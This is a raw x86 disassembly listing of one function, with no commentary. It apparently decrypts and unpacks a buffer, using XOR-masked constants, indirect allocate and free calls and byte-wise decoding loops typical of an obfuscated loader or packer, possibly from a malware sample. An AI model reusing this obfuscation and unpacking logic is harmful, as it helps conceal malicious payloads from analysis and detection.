  41d907:	mov    eax,DWORD PTR [ebp+0x8]
  41d90a:	mov    eax,DWORD PTR [eax+0x19c]
  41d910:	push   DWORD PTR [eax]
  41d912:	call   DWORD PTR [edi+0x8]
  41d915:	mov    DWORD PTR [ebp-0x24],eax
  41d918:	mov    eax,DWORD PTR [ebp+0x8]
  41d91b:	mov    edi,DWORD PTR [eax+0x1d8]
  41d921:	mov    esi,DWORD PTR [ebp+0x8]
  41d924:	xor    eax,eax
  41d926:	lea    edx,[ebp-0x90]
  41d92c:	call   0x41fb32
  41d931:	push   eax
  41d932:	mov    eax,DWORD PTR [ebp+0x8]
  41d935:	mov    eax,DWORD PTR [eax+0x19c]
  41d93b:	push   DWORD PTR [eax]
  41d93d:	call   DWORD PTR [edi+0x8]
  41d940:	and    DWORD PTR [ebp-0x1c],0x0
  41d944:	mov    eax,DWORD PTR [ebp-0x1c]
  41d947:	and    eax,0x7
  41d94a:	add    eax,0x31
  41d94d:	push   eax
  41d94e:	call   DWORD PTR [ebp-0x24]
  41d951:	test   eax,eax
  41d953:	jne    0x41d95a
  41d955:	and    DWORD PTR [ebp-0x10],eax
  41d958:	jmp    0x41d982
  41d95a:	mov    eax,DWORD PTR [ebp+0x8]
  41d95d:	mov    edi,DWORD PTR [eax+0x1d8]
  41d963:	mov    esi,DWORD PTR [ebp+0x8]
  41d966:	xor    eax,eax
  41d968:	lea    edx,[ebp-0x68]
  41d96b:	call   0x41fb32
  41d970:	push   eax
  41d971:	mov    eax,DWORD PTR [ebp+0x8]
  41d974:	mov    eax,DWORD PTR [eax+0x198]
  41d97a:	push   DWORD PTR [eax]
  41d97c:	call   DWORD PTR [edi+0x8]
  41d97f:	mov    DWORD PTR [ebp-0x10],eax
  41d982:	inc    DWORD PTR [ebp-0x1c]
  41d985:	cmp    DWORD PTR [ebp-0x1c],0x10
  41d989:	jb     0x41d944
  41d98b:	mov    eax,DWORD PTR [ebp-0x18]
  41d98e:	mov    esi,DWORD PTR [ebp+0x8]
  41d991:	xor    eax,ebx
  41d993:	mov    edi,0x3272e2
  41d998:	add    eax,edi
  41d99a:	lea    edx,[ebp-0xe4]
  41d9a0:	call   0x41fb32
  41d9a5:	push   eax
  41d9a6:	mov    eax,DWORD PTR [ebp-0x14]
  41d9a9:	mov    esi,DWORD PTR [ebp+0x8]
  41d9ac:	xor    eax,ebx
  41d9ae:	add    eax,edi
  41d9b0:	lea    edx,[ebp-0x104]
  41d9b6:	call   0x41fb32
  41d9bb:	push   eax
  41d9bc:	call   DWORD PTR [ebp-0x10]
  41d9bf:	mov    ecx,DWORD PTR [ebp-0x14]
  41d9c2:	xor    ecx,ebx
  41d9c4:	add    ecx,edi
  41d9c6:	cmp    ecx,eax
  41d9c8:	jne    0x41d9d1
  41d9ca:	mov    DWORD PTR [ebp-0x20],0x1
  41d9d1:	mov    eax,DWORD PTR [ebp-0x18]
  41d9d4:	mov    ecx,DWORD PTR [ebp-0x8]
  41d9d7:	xor    eax,ebx
  41d9d9:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9e0:	mov    DWORD PTR [ebp-0x8],eax
  41d9e3:	mov    eax,DWORD PTR [ebp-0x20]
  41d9e6:	test   eax,eax
  41d9e8:	je     0x41d9fc
  41d9ea:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ed:	mov    ecx,DWORD PTR [ebp-0x38]
  41d9f0:	xor    eax,ebx
  41d9f2:	lea    eax,[eax+ecx*1+0x3272e2]
  41d9f9:	mov    DWORD PTR [ebp-0x38],eax
  41d9fc:	mov    eax,DWORD PTR [ebp-0x18]
  41d9ff:	xor    eax,ebx
  41da01:	mov    ecx,0xffcd8d1e
  41da06:	sub    ecx,eax
  41da08:	add    ecx,DWORD PTR [ebp-0x28]
  41da0b:	mov    eax,DWORD PTR [ebp-0x8]
  41da0e:	cmp    eax,ecx
  41da10:	jbe    0x41d8b9
  41da16:	mov    esi,edi
  41da18:	mov    eax,DWORD PTR [ebp-0x38]
  41da1b:	mov    ecx,DWORD PTR [ebp-0x8]
  41da1e:	cmp    ecx,eax
  41da20:	jne    0x41da33
  41da22:	push   DWORD PTR [ebp+0x8]
  41da25:	lea    eax,[ebp-0x3c]
  41da28:	push   eax
  41da29:	call   0x4205aa
  41da2e:	mov    DWORD PTR [ebp-0x2c],eax
  41da31:	jmp    0x41da3f
  41da33:	mov    eax,DWORD PTR [ebp-0x2c]
  41da36:	mov    ecx,DWORD PTR [ebp-0x18]
  41da39:	xor    ecx,ebx
  41da3b:	add    ecx,esi
  41da3d:	xor    DWORD PTR [eax],ecx
  41da3f:	mov    eax,DWORD PTR [ebp-0x14]
  41da42:	mov    ecx,DWORD PTR [ebp-0x2c]
  41da45:	xor    eax,ebx
  41da47:	add    eax,esi
  41da49:	cmp    eax,ecx
  41da4b:	je     0x41e1c5
  41da51:	mov    eax,DWORD PTR [ebp-0x14]
  41da54:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da57:	xor    eax,ebx
  41da59:	add    eax,esi
  41da5b:	cmp    eax,ecx
  41da5d:	je     0x41e1c5
  41da63:	mov    eax,DWORD PTR [ebp-0x14]
  41da66:	xor    eax,ebx
  41da68:	add    eax,esi
  41da6a:	jmp    0x41da88
  41da6c:	mov    edi,DWORD PTR [ebp-0x2c]
  41da6f:	mov    cl,al
  41da71:	and    cl,0x1f
  41da74:	or     dl,0xff
  41da77:	sub    dl,cl
  41da79:	add    BYTE PTR [edi+eax*1],dl
  41da7c:	mov    ecx,DWORD PTR [ebp-0x18]
  41da7f:	xor    ecx,ebx
  41da81:	lea    eax,[eax+ecx*1+0x3272e2]
  41da88:	mov    ecx,DWORD PTR [ebp-0x3c]
  41da8b:	cmp    eax,ecx
  41da8d:	jb     0x41da6c
  41da8f:	mov    eax,DWORD PTR [ebp-0x3c]
  41da92:	mov    DWORD PTR [ebp-0x28],eax
  41da95:	mov    eax,DWORD PTR [ebp-0x2c]
  41da98:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41da9f:	mov    DWORD PTR [ebp-0xbc],eax
  41daa5:	mov    edi,0xf89c8584
  41daaa:	mov    DWORD PTR [ebp-0x30],edi
  41daad:	mov    eax,DWORD PTR [ebp-0x38]
  41dab0:	xor    eax,ebx
  41dab2:	add    eax,esi
  41dab4:	mov    DWORD PTR [ebp-0xc],eax
  41dab7:	mov    eax,DWORD PTR [ebp-0x38]
  41daba:	xor    eax,ebx
  41dabc:	add    eax,esi
  41dabe:	mov    DWORD PTR [ebp-0x8],eax
  41dac1:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41dac8:	mov    DWORD PTR [ebp-0x54],0xf89c85be
  41dacf:	mov    eax,DWORD PTR [ebp-0x38]
  41dad2:	mov    ecx,DWORD PTR [ebp-0x28]
  41dad5:	xor    eax,ebx
  41dad7:	add    eax,esi
  41dad9:	cmp    ecx,eax
  41dadb:	je     0x41dcda
  41dae1:	jmp    0x41dcb6
  41dae6:	mov    ecx,DWORD PTR [ebp-0xc]
  41dae9:	mov    eax,DWORD PTR [ebp-0x28]
  41daec:	sub    eax,ecx
  41daee:	mov    ecx,DWORD PTR [ebp-0x48]
  41daf1:	xor    ecx,ebx
  41daf3:	add    ecx,esi
  41daf5:	xor    edx,edx
  41daf7:	div    ecx
  41daf9:	mov    DWORD PTR [ebp-0x8],eax
  41dafc:	mov    eax,DWORD PTR [ebp-0x54]
  41daff:	mov    ecx,DWORD PTR [ebp-0x8]
  41db02:	xor    eax,ebx
  41db04:	add    eax,esi
  41db06:	cmp    ecx,eax
  41db08:	jbe    0x41db14
  41db0a:	mov    eax,DWORD PTR [ebp-0x54]
  41db0d:	xor    eax,ebx
  41db0f:	add    eax,esi
  41db11:	mov    DWORD PTR [ebp-0x8],eax
  41db14:	mov    eax,DWORD PTR [ebp-0x48]
  41db17:	mov    ecx,DWORD PTR [ebp-0x8]
  41db1a:	xor    eax,ebx
  41db1c:	add    eax,esi
  41db1e:	imul   eax,ecx
  41db21:	mov    DWORD PTR [ebp-0x8],eax
  41db24:	mov    eax,DWORD PTR [ebp-0x38]
  41db27:	mov    ecx,DWORD PTR [ebp-0x8]
  41db2a:	xor    eax,ebx
  41db2c:	add    eax,esi
  41db2e:	cmp    ecx,eax
  41db30:	je     0x41dca4
  41db36:	mov    eax,DWORD PTR [ebp-0x8]
  41db39:	mov    DWORD PTR [ebp-0x10],eax
  41db3c:	mov    eax,DWORD PTR [ebp-0xc]
  41db3f:	add    eax,DWORD PTR [ebp-0xbc]
  41db45:	mov    DWORD PTR [ebp-0x24],0xf89c8585
  41db4c:	mov    DWORD PTR [ebp-0x20],edi
  41db4f:	mov    DWORD PTR [ebp-0xa8],0xf89c85bb
  41db59:	mov    DWORD PTR [ebp-0x8],eax
  41db5c:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41db63:	mov    DWORD PTR [ebp-0x1c],edi
  41db66:	mov    eax,DWORD PTR [ebp-0x24]
  41db69:	xor    eax,ebx
  41db6b:	add    eax,esi
  41db6d:	jmp    0x41dc63
  41db72:	mov    DWORD PTR [ebp-0xb0],0xf89c85b3
  41db7c:	mov    DWORD PTR [ebp-0xb8],0xf89c85a9
  41db86:	mov    eax,DWORD PTR [ebp-0x1c]
  41db89:	mov    ecx,DWORD PTR [ebp-0x44]
  41db8c:	xor    eax,ebx
  41db8e:	add    eax,esi
  41db90:	imul   eax,ecx
  41db93:	mov    ecx,DWORD PTR [ebp-0x8]
  41db96:	mov    al,BYTE PTR [eax+ecx*1]
  41db99:	mov    BYTE PTR [ebp-0x2],al
  41db9c:	mov    eax,DWORD PTR [ebp-0x1c]
  41db9f:	mov    ecx,DWORD PTR [ebp-0x44]
  41dba2:	xor    eax,ebx
  41dba4:	add    eax,esi
  41dba6:	imul   eax,ecx
  41dba9:	mov    ecx,DWORD PTR [ebp-0xa8]
  41dbaf:	xor    ecx,ebx
  41dbb1:	add    eax,ecx
  41dbb3:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbb6:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dbbe:	mov    ecx,DWORD PTR [ebp-0xb0]
  41dbc4:	xor    ecx,ebx
  41dbc6:	lea    eax,[ecx+eax*1+0x3272e2]
  41dbcd:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dbd1:	xor    ecx,eax
  41dbd3:	mov    BYTE PTR [ebp-0x2],cl
  41dbd6:	mov    al,BYTE PTR [ebp-0x2]
  41dbd9:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dbdc:	mov    edx,DWORD PTR [ebp-0x44]
  41dbdf:	xor    ecx,ebx
  41dbe1:	add    ecx,esi
  41dbe3:	imul   ecx,edx
  41dbe6:	mov    edx,DWORD PTR [ebp-0x8]
  41dbe9:	mov    BYTE PTR [ecx+edx*1],al
  41dbec:	mov    eax,DWORD PTR [ebp-0x1c]
  41dbef:	mov    ecx,DWORD PTR [ebp-0x44]
  41dbf2:	xor    eax,ebx
  41dbf4:	add    eax,esi
  41dbf6:	imul   eax,ecx
  41dbf9:	mov    ecx,DWORD PTR [ebp-0x8]
  41dbfc:	mov    al,BYTE PTR [eax+ecx*1]
  41dbff:	mov    BYTE PTR [ebp-0x2],al
  41dc02:	mov    eax,DWORD PTR [ebp-0x1c]
  41dc05:	mov    ecx,DWORD PTR [ebp-0x44]
  41dc08:	xor    eax,ebx
  41dc0a:	add    eax,esi
  41dc0c:	imul   eax,ecx
  41dc0f:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc12:	xor    ecx,ebx
  41dc14:	add    eax,ecx
  41dc16:	mov    ecx,DWORD PTR [ebp-0x8]
  41dc19:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41dc21:	mov    ecx,DWORD PTR [ebp-0xb8]
  41dc27:	xor    ecx,ebx
  41dc29:	lea    eax,[ecx+eax*1+0x3272e2]
  41dc30:	movzx  ecx,BYTE PTR [ebp-0x2]
  41dc34:	xor    ecx,eax
  41dc36:	mov    BYTE PTR [ebp-0x2],cl
  41dc39:	mov    al,BYTE PTR [ebp-0x2]
  41dc3c:	mov    ecx,DWORD PTR [ebp-0x1c]
  41dc3f:	mov    edx,DWORD PTR [ebp-0x44]
  41dc42:	xor    ecx,ebx
  41dc44:	add    ecx,esi
  41dc46:	imul   ecx,edx
  41dc49:	mov    edx,DWORD PTR [ebp-0x8]
  41dc4c:	mov    BYTE PTR [ecx+edx*1],al
  41dc4f:	mov    eax,DWORD PTR [ebp-0x34]
  41dc52:	mov    ecx,DWORD PTR [ebp-0x20]
  41dc55:	xor    eax,ebx
  41dc57:	xor    ecx,ebx
  41dc59:	add    eax,esi
  41dc5b:	add    ecx,esi
  41dc5d:	imul   eax,ecx
  41dc60:	add    eax,DWORD PTR [ebp-0x44]
  41dc63:	mov    DWORD PTR [ebp-0x44],eax
  41dc66:	mov    eax,DWORD PTR [ebp-0x44]
  41dc69:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc6c:	cmp    ecx,eax
  41dc6e:	jb     0x41db72
  41dc74:	mov    eax,DWORD PTR [ebp-0x20]
  41dc77:	mov    ecx,DWORD PTR [ebp-0x10]
  41dc7a:	xor    eax,ebx
  41dc7c:	add    eax,esi
  41dc7e:	imul   eax,ecx
  41dc81:	mov    ecx,DWORD PTR [ebp-0x24]
  41dc84:	xor    ecx,ebx
  41dc86:	add    ecx,esi
  41dc88:	or     eax,ecx
  41dc8a:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc8d:	xor    ecx,ebx
  41dc8f:	add    eax,ecx
  41dc91:	mov    ecx,DWORD PTR [ebp-0x30]
  41dc94:	xor    ecx,ebx
  41dc96:	add    eax,ecx
  41dc98:	mov    ecx,DWORD PTR [ebp-0xc]
  41dc9b:	lea    eax,[eax+ecx*1+0x64e5c4]
  41dca2:	jmp    0x41dcb3
  41dca4:	mov    eax,DWORD PTR [ebp-0x30]
  41dca7:	mov    ecx,DWORD PTR [ebp-0xc]
  41dcaa:	xor    eax,ebx
  41dcac:	lea    eax,[eax+ecx*1+0x3272e2]
  41dcb3:	mov    DWORD PTR [ebp-0xc],eax
  41dcb6:	mov    eax,DWORD PTR [ebp-0x30]
  41dcb9:	xor    eax,ebx
  41dcbb:	mov    ecx,0xffcd8d1e
  41dcc0:	sub    ecx,eax
  41dcc2:	add    ecx,DWORD PTR [ebp-0x28]
  41dcc5:	mov    eax,DWORD PTR [ebp-0x30]
  41dcc8:	mov    edx,DWORD PTR [ebp-0xc]
  41dccb:	xor    eax,ebx
  41dccd:	add    eax,esi
  41dccf:	imul   eax,edx
  41dcd2:	cmp    eax,ecx
  41dcd4:	jbe    0x41dae6
  41dcda:	mov    eax,DWORD PTR [ebp-0x14]
  41dcdd:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dce0:	mov    eax,DWORD PTR [ebp+0x8]
  41dce3:	mov    edx,DWORD PTR [ebp-0x4c]
  41dce6:	mov    eax,DWORD PTR [eax+0x1d8]
  41dcec:	xor    edx,ebx
  41dcee:	add    edx,esi
  41dcf0:	push   edx
  41dcf1:	mov    edx,DWORD PTR [ebp-0x40]
  41dcf4:	xor    edx,ebx
  41dcf6:	add    edx,esi
  41dcf8:	push   edx
  41dcf9:	push   ecx
  41dcfa:	mov    DWORD PTR [ebp-0x34],ecx
  41dcfd:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd00:	xor    ecx,ebx
  41dd02:	add    ecx,esi
  41dd04:	push   ecx
  41dd05:	call   DWORD PTR [eax+0x14]
  41dd08:	mov    edi,eax
  41dd0a:	mov    eax,DWORD PTR [ebp-0x14]
  41dd0d:	xor    eax,ebx
  41dd0f:	add    eax,esi
  41dd11:	cmp    eax,edi
  41dd13:	je     0x41dd6e
  41dd15:	mov    eax,DWORD PTR [ebp-0x14]
  41dd18:	jmp    0x41dd3b
  41dd1a:	mov    ecx,DWORD PTR [ebp-0x2c]
  41dd1d:	xor    eax,ebx
  41dd1f:	mov    cl,BYTE PTR [ecx+eax*1+0x3272e2]
  41dd26:	mov    BYTE PTR [eax+edi*1+0x3272e2],cl
  41dd2d:	mov    ecx,DWORD PTR [ebp-0x18]
  41dd30:	xor    ecx,ebx
  41dd32:	lea    eax,[ecx+eax*1+0x3272e2]
  41dd39:	xor    eax,ebx
  41dd3b:	mov    ecx,DWORD PTR [ebp-0x3c]
  41dd3e:	sub    ecx,esi
  41dd40:	xor    ecx,ebx
  41dd42:	cmp    eax,ecx
  41dd44:	jne    0x41dd1a
  41dd46:	mov    eax,DWORD PTR [ebp+0x8]
  41dd49:	mov    ecx,DWORD PTR [ebp-0x50]
  41dd4c:	mov    eax,DWORD PTR [eax+0x1d8]
  41dd52:	xor    ecx,ebx
  41dd54:	add    ecx,esi
  41dd56:	push   ecx
  41dd57:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd5a:	xor    ecx,ebx
  41dd5c:	add    ecx,esi
  41dd5e:	push   ecx
  41dd5f:	push   DWORD PTR [ebp-0x2c]
  41dd62:	call   DWORD PTR [eax+0x18]
  41dd65:	mov    eax,DWORD PTR [ebp-0x34]
  41dd68:	mov    DWORD PTR [ebp-0x2c],edi
  41dd6b:	mov    DWORD PTR [ebp-0x3c],eax
  41dd6e:	mov    eax,DWORD PTR [ebp-0x2c]
  41dd71:	mov    DWORD PTR [ebp-0x10],eax
  41dd74:	mov    eax,DWORD PTR [ebp-0x18]
  41dd77:	mov    ecx,DWORD PTR [ebp-0x14]
  41dd7a:	xor    eax,ebx
  41dd7c:	add    eax,esi
  41dd7e:	mov    DWORD PTR [ebp-0x5c],0x3d142c14
  41dd85:	mov    DWORD PTR [ebp-0x58],0x27143f14
  41dd8c:	jmp    0x41ddbf
  41dd8e:	mov    edx,DWORD PTR [ebp-0x10]
  41dd91:	mov    edi,ecx
  41dd93:	xor    edi,ebx
  41dd95:	mov    cl,BYTE PTR [ebp+edi*1+0x327286]
  41dd9c:	movsx  edx,BYTE PTR [edi+edx*1+0x3272e2]
  41dda4:	xor    cl,0x74
  41dda7:	sub    cl,0x8
  41ddaa:	movzx  ecx,cl
  41ddad:	cmp    edx,ecx
  41ddaf:	jne    0x41ddc9
  41ddb1:	mov    ecx,DWORD PTR [ebp-0x18]
  41ddb4:	xor    ecx,ebx
  41ddb6:	lea    ecx,[ecx+edi*1+0x3272e2]
  41ddbd:	xor    ecx,ebx
  41ddbf:	cmp    ecx,0xf89c85bd
  41ddc5:	jne    0x41dd8e
  41ddc7:	jmp    0x41ddd0
  41ddc9:	mov    eax,DWORD PTR [ebp-0x14]
  41ddcc:	xor    eax,ebx
  41ddce:	add    eax,esi
  41ddd0:	mov    ecx,DWORD PTR [ebp-0x14]
  41ddd3:	xor    ecx,ebx
  41ddd5:	add    ecx,esi
  41ddd7:	cmp    ecx,eax
  41ddd9:	je     0x41df4f
  41dddf:	mov    eax,DWORD PTR [ebp-0x10]
  41dde2:	mov    eax,DWORD PTR [eax+0x8]
  41dde5:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  41ddec:	mov    DWORD PTR [ebp-0x40],0xf89cc316
  41ddf3:	mov    DWORD PTR [ebp-0x48],0xf89cb585
  41ddfa:	mov    DWORD PTR [ebp-0x24],0xf89c85b9
  41de01:	mov    DWORD PTR [ebp-0x20],eax
  41de04:	mov    eax,DWORD PTR [ebp+0x8]
  41de07:	mov    ecx,DWORD PTR [ebp-0x24]
  41de0a:	xor    ecx,ebx
  41de0c:	add    ecx,esi
  41de0e:	push   ecx
  41de0f:	mov    ecx,DWORD PTR [ebp-0x48]
  41de12:	mov    eax,DWORD PTR [eax+0x1d8]
  41de18:	xor    ecx,ebx
  41de1a:	add    ecx,esi
  41de1c:	push   ecx
  41de1d:	mov    ecx,DWORD PTR [ebp-0x40]
  41de20:	xor    ecx,ebx
  41de22:	add    ecx,esi
  41de24:	push   ecx
  41de25:	mov    ecx,DWORD PTR [ebp-0xc]
  41de28:	xor    ecx,ebx
  41de2a:	add    ecx,esi
  41de2c:	push   ecx
  41de2d:	call   DWORD PTR [eax+0x14]
  41de30:	mov    edi,eax
  41de32:	mov    eax,DWORD PTR [ebp+0x8]
  41de35:	mov    ecx,DWORD PTR [ebp-0x24]
  41de38:	mov    eax,DWORD PTR [eax+0x1d8]
  41de3e:	xor    ecx,ebx
  41de40:	add    ecx,esi
  41de42:	push   ecx
  41de43:	mov    ecx,DWORD PTR [ebp-0x48]
  41de46:	xor    ecx,ebx
  41de48:	add    ecx,esi
  41de4a:	push   ecx
  41de4b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de4e:	push   DWORD PTR [ebp-0x20]
  41de51:	xor    ecx,ebx
  41de53:	add    ecx,esi
  41de55:	push   ecx
  41de56:	call   DWORD PTR [eax+0x14]
  41de59:	mov    ecx,DWORD PTR [ebp-0xc]
  41de5c:	xor    ecx,ebx
  41de5e:	add    ecx,esi
  41de60:	mov    DWORD PTR [ebp-0x24],eax
  41de63:	cmp    ecx,edi
  41de65:	je     0x41e1f2
  41de6b:	mov    ecx,DWORD PTR [ebp-0xc]
  41de6e:	xor    ecx,ebx
  41de70:	add    ecx,esi
  41de72:	cmp    ecx,eax
  41de74:	je     0x41e1f2
  41de7a:	mov    DWORD PTR [ebp-0x40],0xf89c85ba
  41de81:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41de88:	mov    ecx,DWORD PTR [ebp-0x40]
  41de8b:	xor    cl,0x9b
  41de8e:	sub    cl,0x1e
  41de91:	mov    BYTE PTR [edi],cl
  41de93:	mov    ecx,DWORD PTR [ebp-0xc]
  41de96:	xor    cl,0x9b
  41de99:	sub    cl,0x1e
  41de9c:	mov    BYTE PTR [edi+0x1],cl
  41de9f:	mov    ecx,DWORD PTR [ebp-0x4c]
  41dea2:	xor    cl,0x9b
  41dea5:	sub    cl,0x1e
  41dea8:	mov    BYTE PTR [edi+0x2],cl
  41deab:	and    DWORD PTR [ebp-0xb4],0x0
  41deb2:	and    DWORD PTR [ebp-0xa4],0x0
  41deb9:	lea    ecx,[ebp-0xa4]
  41debf:	push   ecx
  41dec0:	push   DWORD PTR [ebp-0x20]
  41dec3:	push   eax
  41dec4:	lea    eax,[ebp-0xb4]
  41deca:	push   eax
  41decb:	mov    eax,DWORD PTR [ebp-0x10]
  41dece:	push   DWORD PTR [eax+0xc]
  41ded1:	mov    eax,DWORD PTR [ebp-0x2c]
  41ded4:	add    eax,0x10
  41ded7:	push   eax
  41ded8:	push   edi
  41ded9:	call   0x41d223
  41dede:	mov    DWORD PTR [ebp-0x40],eax
  41dee1:	mov    eax,DWORD PTR [ebp+0x8]
  41dee4:	mov    ecx,DWORD PTR [ebp-0x50]
  41dee7:	mov    eax,DWORD PTR [eax+0x1d8]
  41deed:	xor    ecx,ebx
  41deef:	add    ecx,esi
  41def1:	push   ecx
  41def2:	mov    ecx,DWORD PTR [ebp-0xc]
  41def5:	xor    ecx,ebx
  41def7:	add    ecx,esi
  41def9:	push   ecx
  41defa:	push   edi
  41defb:	call   DWORD PTR [eax+0x18]
  41defe:	mov    eax,DWORD PTR [ebp-0x40]
  41df01:	add    eax,0xffcd8d1e
  41df06:	xor    eax,ebx
  41df08:	cmp    eax,0xf89c8585
  41df0d:	mov    eax,DWORD PTR [ebp+0x8]
  41df10:	mov    eax,DWORD PTR [eax+0x1d8]
  41df16:	mov    ecx,DWORD PTR [ebp-0x50]
  41df19:	jne    0x41df3c
  41df1b:	xor    ecx,ebx
  41df1d:	add    ecx,esi
  41df1f:	push   ecx
  41df20:	mov    ecx,DWORD PTR [ebp-0xc]
  41df23:	xor    ecx,ebx
  41df25:	add    ecx,esi
  41df27:	push   ecx
  41df28:	push   DWORD PTR [ebp-0x2c]
  41df2b:	call   DWORD PTR [eax+0x18]
  41df2e:	mov    eax,DWORD PTR [ebp-0x24]
  41df31:	mov    DWORD PTR [ebp-0x2c],eax
  41df34:	mov    eax,DWORD PTR [ebp-0x20]
  41df37:	mov    DWORD PTR [ebp-0x3c],eax
  41df3a:	jmp    0x41df4f
  41df3c:	xor    ecx,ebx
  41df3e:	add    ecx,esi
  41df40:	push   ecx
  41df41:	mov    ecx,DWORD PTR [ebp-0xc]
  41df44:	xor    ecx,ebx
  41df46:	add    ecx,esi
  41df48:	push   ecx
  41df49:	push   DWORD PTR [ebp-0x24]
  41df4c:	call   DWORD PTR [eax+0x18]
  41df4f:	mov    eax,DWORD PTR [ebp-0x3c]
  41df52:	mov    DWORD PTR [ebp-0x38],eax
  41df55:	mov    eax,DWORD PTR [ebp-0x2c]
  41df58:	mov    DWORD PTR [ebp-0x28],0xf89c8585
  41df5f:	mov    DWORD PTR [ebp-0x40],eax
  41df62:	mov    edi,0xf89c8584
  41df67:	mov    DWORD PTR [ebp-0x30],edi
  41df6a:	mov    eax,DWORD PTR [ebp-0x28]
  41df6d:	xor    eax,ebx
  41df6f:	add    eax,esi
  41df71:	mov    DWORD PTR [ebp-0xc],eax
  41df74:	mov    eax,DWORD PTR [ebp-0x28]
  41df77:	xor    eax,ebx
  41df79:	add    eax,esi
  41df7b:	mov    DWORD PTR [ebp-0x10],eax
  41df7e:	mov    DWORD PTR [ebp-0x48],0xf89c85a5
  41df85:	mov    DWORD PTR [ebp-0x24],0xf89c85be
  41df8c:	mov    eax,DWORD PTR [ebp-0x28]
  41df8f:	mov    ecx,DWORD PTR [ebp-0x38]
  41df92:	xor    eax,ebx
  41df94:	add    eax,esi
  41df96:	cmp    ecx,eax
  41df98:	je     0x41e18e
  41df9e:	jmp    0x41e16a
  41dfa3:	mov    ecx,DWORD PTR [ebp-0xc]
  41dfa6:	mov    eax,DWORD PTR [ebp-0x38]
  41dfa9:	sub    eax,ecx
  41dfab:	mov    ecx,DWORD PTR [ebp-0x48]
  41dfae:	xor    ecx,ebx
  41dfb0:	add    ecx,esi
  41dfb2:	xor    edx,edx
  41dfb4:	div    ecx
  41dfb6:	mov    DWORD PTR [ebp-0x10],eax
  41dfb9:	mov    eax,DWORD PTR [ebp-0x24]
  41dfbc:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfbf:	xor    eax,ebx
  41dfc1:	add    eax,esi
  41dfc3:	cmp    ecx,eax
  41dfc5:	jbe    0x41dfd1
  41dfc7:	mov    eax,DWORD PTR [ebp-0x24]
  41dfca:	xor    eax,ebx
  41dfcc:	add    eax,esi
  41dfce:	mov    DWORD PTR [ebp-0x10],eax
  41dfd1:	mov    eax,DWORD PTR [ebp-0x48]
  41dfd4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfd7:	xor    eax,ebx
  41dfd9:	add    eax,esi
  41dfdb:	imul   eax,ecx
  41dfde:	mov    DWORD PTR [ebp-0x10],eax
  41dfe1:	mov    eax,DWORD PTR [ebp-0x28]
  41dfe4:	mov    ecx,DWORD PTR [ebp-0x10]
  41dfe7:	xor    eax,ebx
  41dfe9:	add    eax,esi
  41dfeb:	cmp    ecx,eax
  41dfed:	je     0x41e158
  41dff3:	mov    eax,DWORD PTR [ebp-0x10]
  41dff6:	mov    DWORD PTR [ebp-0x20],eax
  41dff9:	mov    eax,DWORD PTR [ebp-0xc]
  41dffc:	add    eax,DWORD PTR [ebp-0x40]
  41dfff:	mov    DWORD PTR [ebp-0x54],0xf89c8585
  41e006:	mov    DWORD PTR [ebp-0x10],edi
  41e009:	mov    DWORD PTR [ebp-0x4c],0xf89c85bb
  41e010:	mov    DWORD PTR [ebp-0x1c],eax
  41e013:	mov    DWORD PTR [ebp-0x34],0xf89c85ba
  41e01a:	mov    DWORD PTR [ebp-0x8],edi
  41e01d:	mov    eax,DWORD PTR [ebp-0x54]
  41e020:	xor    eax,ebx
  41e022:	add    eax,esi
  41e024:	jmp    0x41e117
  41e029:	mov    DWORD PTR [ebp-0xac],0xf89c85b3
  41e033:	mov    DWORD PTR [ebp-0x9c],0xf89c85a9
  41e03d:	mov    eax,DWORD PTR [ebp-0x8]
  41e040:	mov    ecx,DWORD PTR [ebp-0x18]
  41e043:	xor    eax,ebx
  41e045:	add    eax,esi
  41e047:	imul   eax,ecx
  41e04a:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e04d:	mov    al,BYTE PTR [eax+ecx*1]
  41e050:	mov    BYTE PTR [ebp-0x1],al
  41e053:	mov    eax,DWORD PTR [ebp-0x8]
  41e056:	mov    ecx,DWORD PTR [ebp-0x18]
  41e059:	xor    eax,ebx
  41e05b:	add    eax,esi
  41e05d:	imul   eax,ecx
  41e060:	mov    ecx,DWORD PTR [ebp-0x4c]
  41e063:	xor    ecx,ebx
  41e065:	add    eax,ecx
  41e067:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e06a:	movzx  eax,BYTE PTR [eax+ecx*1+0x3272e2]
  41e072:	mov    ecx,DWORD PTR [ebp-0xac]
  41e078:	xor    ecx,ebx
  41e07a:	lea    eax,[ecx+eax*1+0x3272e2]
  41e081:	movzx  ecx,BYTE PTR [ebp-0x1]
  41e085:	xor    ecx,eax
  41e087:	mov    BYTE PTR [ebp-0x1],cl
  41e08a:	mov    al,BYTE PTR [ebp-0x1]
  41e08d:	mov    ecx,DWORD PTR [ebp-0x8]
  41e090:	mov    edx,DWORD PTR [ebp-0x18]
  41e093:	xor    ecx,ebx
  41e095:	add    ecx,esi
  41e097:	imul   ecx,edx
  41e09a:	mov    edx,DWORD PTR [ebp-0x1c]
  41e09d:	mov    BYTE PTR [ecx+edx*1],al
  41e0a0:	mov    eax,DWORD PTR [ebp-0x8]
  41e0a3:	mov    ecx,DWORD PTR [ebp-0x18]
  41e0a6:	xor    eax,ebx
  41e0a8:	add    eax,esi
  41e0aa:	imul   eax,ecx
  41e0ad:	mov    ecx,DWORD PTR [ebp-0x1c]
  41e0b0:	mov    al,BYTE PTR [eax+ecx*1]
